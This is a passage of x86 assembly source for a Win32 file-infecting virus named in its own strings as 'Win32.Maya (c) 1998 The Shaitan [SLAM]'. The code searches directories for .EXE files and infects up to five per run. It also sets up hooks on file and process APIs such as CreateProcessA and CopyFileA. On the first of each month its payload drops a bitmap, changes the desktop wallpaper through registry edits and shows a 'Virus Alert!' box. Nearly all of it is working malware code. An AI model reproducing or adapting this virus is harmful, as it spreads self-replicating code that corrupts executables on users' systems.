        je      ICAWD_end               ; Yes, Jump...

        call    InfectCurrentDirectory  ; Infect some files there

        mov     eax,offset currdir      ; Offset of ASCIIZ dir string
        add     eax,ebp                 ; Adjust with delta
        call    VxSetCurrentDirectory   ; Change to original directory

ICAWD_end:
        ret                             ; Return to caller

;----------------------------------------------------------------------------
; InfectCurrentDirectory -
;----------------------------------------------------------------------------
InfectCurrentDirectory:
        push    ebp                     ; Save Delta
        mov     eax,offset wfd          ; WIN32_FIND_DATA structure
        add     eax,ebp                 ; Adjust with delta
        push    eax                     ; Push onto stack
        mov     eax,offset exe_match    ; Search for *.EXE
        add     eax,ebp                 ; Adjust with delta
        push    eax                     ; Push onto stack
        mov     eax,[_FindFirstFileA+ebp]; Address of API to call
        call    eax                     ; Call API
        pop     ebp                     ; Restore delta
        cmp     eax,0ffffffffh          ; No matching files found?
        je      icd_end                 ; Cannot continue...
        mov     [search_handle+ebp],eax ; Save search handle

        mov     edx,offset wfd.cFileName; Offset to ASCIIZ filename
        add     edx,ebp                 ; Adjust with delta pointer
        call    InfectFile              ; Infect da file

        cmp     [infect_success+ebp],1  ; Successful infection?
        jne     fnf_loop                ; No. Find next file to infect
        inc     [infect_counter+ebp]    ; Increment infection counter
        cmp     [infect_counter+ebp],5  ; Max no. of file infected?
        je      icd_end                 ; Yes. Quit...

fnf_loop:
        push    ebp                     ; Save delta pointer
        mov     eax,offset wfd          ; W32_FIND_DATA structure
        add     eax,ebp                 ; Adjust
        push    eax                     ; Push parametre onto stack
        push    [search_handle+ebp]     ; Push handle of search onto stack
        mov     eax,[_FindNextFileA+ebp]; API to call
        call    eax                     ; Find next file...
        pop     ebp                     ; Restore delta pointer
        cmp     eax,0                   ; File found?
        je      icd_end                 ; No. Quit...
        mov     edx,offset wfd.cFileName; ASCIIZ filename of found file
        add     edx,ebp                 ; Adjust with delta
        call    InfectFile              ; Infect it...
        cmp     [infect_success+ebp],1  ; Successful infection?
        jne     fnf_loop                ; Nope. Loop...
        inc     [infect_counter+ebp]    ; Increment counter
        cmp     [infect_counter+ebp],5  ; Max infections reached?
        je      icd_end                 ; Yeah. Quit..
        jmp     fnf_loop                ; Loop...
icd_end:
        ret                             ; Return to caller

;----------------------------------------------------------------------------
; Payload -
;----------------------------------------------------------------------------
Payload:
        call    VxGetSystemTime         ; Get current date/time
        cmp     [st.wDay+ebp],1         ; Is it the 1st of any month?
        jne     payload_end             ; No. Don't activate payload...

        mov     eax,offset u32_string   ; USER32.DLL ASCIIZ string
        add     eax,ebp                 ; Adjust
        call    VxGetModuleHandle       ; Get base address of module
        cmp     eax,00000000h           ; Failed?
        je      payload_end             ; Yes. Don't continue...
        mov     [user32+ebp],eax        ; Save address of USER32.DLL

        mov     eax,offset a32_string   ; ADVAPI32.DLL ASCIIZ string
        add     eax,ebp                 ; Adjust
        call    VxGetModuleHandle       ; Get base address of module
        cmp     eax,00000000h           ; Failed?
        je      payload_end             ; Yes. Don't continue...
        mov     [advapi32+ebp],eax      ; Save address of ADVAPI32.DLL

        mov     edx,offset regopen_string; ASCIIZ "RegOpenKeyExA"
        add     edx,ebp                 ; Adjust
        mov     eax,[advapi32+ebp]      ; Base address of ADVAPI32.DLL
        call    VxGetProcAddress        ; Get address of API call
        cmp     eax,00000000h           ; Function failed?
        je      payload_end             ; Yes. Don't continue...
        mov     [_RegOpenKeyExA+ebp],eax; Save address of API function

        mov     edx,offset regset_string; ASCIIZ "RegSetValueExA"
        add     edx,ebp                 ; Adjust
        mov     eax,[advapi32+ebp]      ; Base address of ADVAPI32.DLL
        call    VxGetProcAddress        ; Get address of API call
        cmp     eax,00000000h           ; Function failed?
        je      payload_end             ; Yes. Don't continue...
        mov     [_RegSetValueExA+ebp],eax; Save address of API function

        mov     edx,offset msgbox_string; ASCIIZ "MessageBoxA"
        add     edx,ebp                 ; Adjust
        mov     eax,[user32+ebp]        ; Base address of USER32.DLL
        call    VxGetProcAddress        ; Get address of API call
        cmp     eax,00000000h           ; Function failed?
        je      payload_end             ; Yes. Don't continue...
        mov     [_MessageBoxA+ebp],eax  ; Save address of API function

        mov     edx,offset sysinf_string; ASCIIZ "SystemParametersInfoA"
        add     edx,ebp                 ; Adjust
        mov     eax,[user32+ebp]        ; Base address of USER32.DLL
        call    VxGetProcAddress        ; Get address of API call
        cmp     eax,00000000h           ; Function failed?
        je      payload_end             ; Yes. Don't continue...
        mov     [_SystemParametersInfoA+ebp],eax; Save address of API function

        push    00000000h               ; Handle to template file (?)
        push    FILE_ATTRIBUTE_NORMAL   ; File attributes
        push    CREATE_ALWAYS           ; Create new file
        push    00000000h               ; Security attributes
        push    FILE_SHARE_READ         ; Allow read access to others
        push    GENERIC_WRITE           ; Open for writing only
        mov     eax,offset wallpaper    ; ASCIIZ Filename ("SLAM.BMP")
        add     eax,ebp                 ; Adjust with delta
        push    eax                     ; Pass as parameter
        mov     eax,[_CreateFileA+ebp]  ; Address of API to call
        call    eax                     ; Call API
        cmp     eax,0ffffffffh          ; Error?
        je      payload_end             ; Yes. Don't continue
        mov     [bmp_handle+ebp],eax    ; Save opened file's handle

        push    00000000h               ; Overlapping (not supported)
        mov     eax,offset num_bytes_written; Actual no. of bytes written
        add     eax,ebp                 ; "     "       "       "       "
        push    eax                     ; "     "       "       "       "
        push    bmp_filesize            ; No. of bytes to write
        mov     eax,offset bmp_data_start; Start of BMP data buffer
        add     eax,ebp                 ; "     "       "       "       "
        push    eax                     ; "     "       "       "       "
        push    [bmp_handle+ebp]        ; Handle of opened file
        mov     eax,[_WriteFile+ebp]    ; Address of API to call
        call    eax                     ; Call API

        push    [bmp_handle+ebp]        ; Handle of opened file
        mov     eax,[_CloseHandle+ebp]  ; Address of API to call
        call    eax                     ; Call API
                                        
        mov     eax,offset phkey        ; Address of handle of open key 
        add     eax,ebp                 ; "     "       "       "       "
        push    eax                     ; "     "       "       "       "
        push    KEY_SET_VALUE           ; Security access mask 
        push    00000000h               ; Reserved (?)
        mov     eax,offset subkey       ; Address of name of subkey to open
        add     eax,ebp                 ; "     "       "       "       "
        push    eax                     ; "     "       "       "       "
        push    HKEY_CURRENT_USER       ; Handle of open key 
        mov     eax,[_RegOpenKeyExA+ebp]; Address of API to call
        call    eax                     ; Call API
                                        
        push    00000002h               ; Size of value data
        mov     eax,offset twp_data     ; Address of value data 
        add     eax,ebp                 ; "     "       "       "
        push    eax                     ; "     "       "       "
        push    REG_SZ                  ; Flag for value data
        push    00000000h               ; Reserved (?)
        mov     eax,offset twp_string   ; Address of value to set
        add     eax,ebp                 ; "     "       "       "
        push    eax                     ; "     "       "       "
        push    [phkey+ebp]             ; Handle of key to set value for
        mov     eax,[_RegSetValueExA+ebp]; Address of API to call
        call    eax                     ; Call API

        push    00000002h               ; Size of value data
        mov     eax,offset wps_data     ; Address of value data 
        add     eax,ebp                 ; "     "       "       "
        push    eax                     ; "     "       "       "
        push    REG_SZ                  ; Flag for value data
        push    00000000h               ; Reserved (?)
        mov     eax,offset wps_string   ; Address of value to set
        add     eax,ebp                 ; "     "       "       "
        push    eax                     ; "     "       "       "
        push    [phkey+ebp]             ; Handle of key to set value for
        mov     eax,[_RegSetValueExA+ebp]; Address of API to call
        call    eax                     ; Call API
                                        
        push    00000000h               ; User profile update flag
        mov     eax,offset wallpaper    ; ASCIIZ filename of .BMP file
        add     eax,ebp                 ; "     "       "       "       
        push    eax                     ; "     "       "       "
        push    00000000h               ; Not applicable here
        push    SPI_SETDESKWALLPAPER    ; System parameter to set
        mov     eax,[_SystemParametersInfoA+ebp]; Address of API to call
        call    eax                     ; Call API

        push    MB_ICONEXCLAMATION      ; Style of message box
        mov     eax,offset mbox_caption ; Address of msg box caption text
        add     eax,ebp                 ; "     "       "       "
        push    eax                     ; "     "       "       "
        mov     eax,offset mbox_text    ; Address of msg box body text
        add     eax,ebp                 ; "     "       "       "
        push    eax                     ; "     "       "       "
        push    00000000h               ; Handle of parent window
        mov     eax,[_MessageBoxA+ebp]  ; Address of API to call
        call    eax                     ; Call API

payload_end:
        ret                             ; Return to caller

;----------------------------------------------------------------------------
; DATA - 
;----------------------------------------------------------------------------

kernel32        dd      0BFF70000h
module_base     dd      400000h                 

windir          db      128     dup     (?)     
currdir         db      128     dup     (?)     

st              SYSTEMTIME      ?

wfd             WIN32_FIND_DATA         ?
search_handle   dd      ?
exe_match       db      "*.EXE",0

ori_attrib      dd      ?

infect_success  dd      ?
infect_counter  dd      ?

AddressOfFunctions      dd      ?
AddressOfNames          dd      ?
AddressOfOrdinals       dd      ?

itd_va                  dd      ?
fsize_high              dd      ?

new_filesize            dd      ?
file_handle             dd      ?
map_handle              dd      ?
map_address             dd      ?
pe_header               dd      ?
last_entry              dd      ?
file_align              dd      ?
ori_eip                 dd      offset g1_quit - 400000h
new_eip                 dd      ?
tmp_eip                 dd      ?
size_rawdata            dd      ?

k32_string              db      "KERNEL32.dll",0
k32_string_len          equ     $ - offset k32_string

; API_NAME_STRUCT -
;
; DWORD   LengthOfAPIString
; BYTES   ASCIIZAPIString
; DWORD   APIAddress
;
api_names:

GMH_string_len          dd      offset _GetModuleHandleA - offset GMH_string
GMH_string              db      "GetModuleHandleA",0
_GetModuleHandleA       dd      ?

GPA_string_len          dd      offset _GetProcAddress - offset GPA_string
GPA_string              db      "GetProcAddress",0
_GetProcAddress         dd      ?

CFA_string_len          dd      offset _CreateFileA - offset CFA_string
CFA_string              db      "CreateFileA",0
_CreateFileA            dd      ?

WF_string_len           dd      offset _WriteFile - offset WF_string
WF_string               db      "WriteFile",0
_WriteFile              dd      ?

GFS_string_len          dd      offset _GetFileSize - offset GFS_string
GFS_string              db      "GetFileSize",0
_GetFileSize            dd      ?

CFM_string_len          dd      offset _CreateFileMappingA - offset CFM_string
CFM_string              db      "CreateFileMappingA",0
_CreateFileMappingA     dd      ?

MVOF_string_len         dd      offset _MapViewOfFile - offset MVOF_string
MVOF_string             db      "MapViewOfFile",0
_MapViewOfFile          dd      ?

UVOF_string_len         dd      offset _UnmapViewOfFile - offset UVOF_string
UVOF_string             db      "UnmapViewOfFile",0
_UnmapViewOfFile        dd      ?

CH_string_len           dd      offset _CloseHandle - offset CH_string
CH_string               db      "CloseHandle",0
_CloseHandle            dd      ?

FFFA_string_len         dd      offset _FindFirstFileA - offset FFFA_string
FFFA_string             db      "FindFirstFileA",0
_FindFirstFileA         dd      ?

FNFA_string_len         dd      offset _FindNextFileA - offset FNFA_string
FNFA_string             db      "FindNextFileA",0
_FindNextFileA          dd      ?

FC_string_len           dd      offset _FindClose - offset FC_string
FC_string               db      "FindClose",0
_FindClose              dd      ?

SFP_string_len          dd      offset _SetFilePointer - offset SFP_string
SFP_string              db      "SetFilePointer",0
_SetFilePointer         dd      ?

SEOF_string_len         dd      offset _SetEndOfFile - offset SEOF_string
SEOF_string             db      "SetEndOfFile",0
_SetEndOfFile           dd      ?

GCD_string_len          dd      offset _GetCurrentDirectoryA - offset GCD_string
GCD_string              db      "GetCurrentDirectoryA",0
_GetCurrentDirectoryA   dd      ?

SCD_string_len          dd      offset _SetCurrentDirectoryA - offset SCD_string
SCD_string              db      "SetCurrentDirectoryA",0
_SetCurrentDirectoryA   dd      ?

GFA_string_len          dd      offset _GetFileAttributesA - offset GFA_string
GFA_string              db      "GetFileAttributesA",0
_GetFileAttributesA     dd      ?

SFA_string_len          dd      offset _SetFileAttributesA - offset SFA_string
SFA_string              db      "SetFileAttributesA",0
_SetFileAttributesA     dd      ?

GST_string_len          dd      offset _GetSystemTime - offset GST_string
GST_string              db      "GetSystemTime",0
_GetSystemTime          dd      ?

GWD_string_len          dd      offset _GetWindowsDirectoryA - offset GWD_string
GWD_string              db      "GetWindowsDirectoryA",0
_GetWindowsDirectoryA   dd      ?

EndOfAPI_strings        dd      'MAYA'

;
; API calls that we will try to hook...
;
hookable_api:

MF_string_len           dd      offset _MoveFileA - offset MF_string
MF_string               db      "MoveFileA",0
_MoveFileA              dd      ?
MF_handler              dd      offset HookMoveFile

CFH_string_len          dd      offset _CopyFileA - offset CFH_string
CFH_string              db      "CopyFileA",0
_CopyFileA              dd      ?
CFH_handler             dd      offset HookCopyFile

CFILE_string_len        dd      offset _CreateFileHook - offset CFILE_string
CFILE_string            db      "CreateFileA",0
_CreateFileHook         dd      ?
CFILE_handler           dd      offset HookCreateFile

DF_string_len           dd      offset _DeleteFileA - offset DF_string
DF_string               db      "DeleteFileA",0
_DeleteFileA            dd      ?
DF_handler              dd      offset HookDeleteFile

SFAH_string_len         dd      offset _SetFileAttributesHook - offset SFAH_string
SFAH_string             db      "SetFileAttributesA",0
_SetFileAttributesHook  dd      ?
SFAH_handler            dd      offset HookSetFileAttributes

GFAH_string_len         dd      offset _GetFileAttributesHook - offset GFAH_string
GFAH_string             db      "GetFileAttributesA",0
_GetFileAttributesHook  dd      ?
GFAH_handler            dd      offset HookGetFileAttributes

GFPN_string_len         dd      offset _GetFullPathNameA - offset GFPN_string
GFPN_string             db      "GetFullPathNameA",0
_GetFullPathNameA       dd      ?
GFPN_handler            dd      offset HookGetFullPathName

CP_string_len           dd      offset _CreateProcessA - offset CP_string
CP_string               db      "CreateProcessA",0
_CreateProcessA         dd      ?
CP_handler              dd      offset HookCreateProcess

last_hook               dd      'SHAI'

; Data for the payload -
subkey                  db      "Control Panel\Desktop",0
phkey                   dd      ?
twp_data                db      "1",0
wps_data                db      "0",0
twp_string              db      "TileWallpaper",0
wps_string              db      "WallpaperStyle",0
wallpaper               db      "SLAM.BMP",0
bmp_handle              dd      ?
num_bytes_written       dd      ?

mbox_text               db      "Win32.Maya (c) 1998 The Shaitan [SLAM]",0
mbox_caption            db      "Virus Alert!",0

u32_string              db      "USER32.dll",0
a32_string              db      "ADVAPI32.dll",0
user32                  dd      ?
advapi32                dd      ?
shell32                 dd      ?

regopen_string          db      "RegOpenKeyExA",0
regset_string           db      "RegSetValueExA",0
msgbox_string           db      "MessageBoxA",0
sysinf_string           db      "SystemParametersInfoA",0
_RegOpenKeyExA          dd      ?
_RegSetValueExA         dd      ?
_MessageBoxA            dd      ?
_SystemParametersInfoA  dd      ?

; The BMP file data -
bmp_data_start:
db      42h,  4Dh,  0E6h, 00h,  00h,  00h,  00h,  00h
db      00h,  00h,  3Eh,  00h,  00h,  00h,  28h,  00h
db      00h,  00h,  3Ch,  00h,  00h,  00h,  15h,  00h
db      00h,  00h,  01h,  00h,  01h,  00h,  00h,  00h
db      00h,  00h,  0A8h, 00h,  00h,  00h,  0C4h, 0Eh
db      00h,  00h,  0C4h, 0Eh,  00h,  00h,  00h,  00h
db      00h,  00h,  00h,  00h,  00h,  00h,  00h,  00h
db      00h,  00h,  0FFh, 0FFh, 0FFh, 00h,  0FFh, 0FFh
db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0F0h, 0FFh, 0FFh
db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0F0h, 0FFh, 0FFh
db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0F0h, 0FFh, 0FFh
db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0F0h, 0E0h, 02h
db      00h,  83h,  0E2h, 0Eh,  3Ch,  70h,  0E0h, 02h
db      00h,  83h,  0E2h, 0Eh,  3Ch,  70h,  0E3h, 82h
db      0Fh,  83h,  0E2h, 0Eh,  3Ch,  70h,  0E3h, 82h
db      0Fh,  83h,  0E2h, 0Eh,  3Ch,  70h,  0E3h, 82h
db      0Fh,  80h,  02h,  0Eh,  3Ch,  70h,  0FFh, 82h
db      0Fh,  80h,  02h,  0Eh,  3Ch,  70h,  0E0h, 02h
db      1Fh,  0C3h, 86h,  1Eh,  3Ch,  70h,  0E0h, 02h
db      3Fh,  0E3h, 8Eh,  3Eh,  3Ch,  70h,  0E3h, 0FEh
db      3Fh,  0E3h, 8Eh,  3Eh,  3Ch,  70h,  0E3h, 0E2h
db      3Fh,  0E3h, 8Eh,  3Eh,  3Ch,  70h,  0E3h, 0E2h
db      3Fh,  0E3h, 8Eh,  3Eh,  3Ch,  70h,  0E3h, 0E2h
db      3Fh,  0E3h, 8Eh,  3Eh,  3Ch,  70h,  0E0h, 02h
db      3Fh,  0E0h, 0Eh,  00h,  00h,  70h,  0E0h, 02h
db      3Fh,  0E0h, 0Eh,  00h,  00h,  70h,  0FFh, 0FFh
db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0F0h, 0FFh, 0FFh
db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0F0h, 0FFh, 0FFh
db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0F0h
bmp_data_end:

code_end:

g1_quit:
        push    00000030h               ; MB_ICONEXCLAMATION
        push    offset mb_caption       ; Title of message box 
        push    offset mb_text          ; Text to display
        push    L 0                     ; Handle to parent (none)
        call    MessageBoxA             ; Display the message box

        push    L 0                     ; Return value
        call    ExitProcess             ; Exit to OS

mb_caption      db      "Virus Alert!",0
mb_text         db      "Win32.Maya (c) 1998 The Shaitan [SLAM]",0

ends
end code_start




